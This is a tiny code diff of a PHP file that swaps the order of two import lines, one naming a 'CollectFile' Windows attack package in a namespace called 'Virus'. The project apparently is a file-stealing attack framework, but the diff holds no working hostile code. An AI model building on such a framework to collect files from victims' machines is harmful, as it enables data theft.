@@ -1,7 +1,7 @@
 <?php
 
-use Kelvinho\Virus\Singleton\Logs;
 use Kelvinho\Virus\Attack\Packages\Windows\OneTime\CollectFile;
+use Kelvinho\Virus\Singleton\Logs;
 
 /** @var CollectFile $this */
 
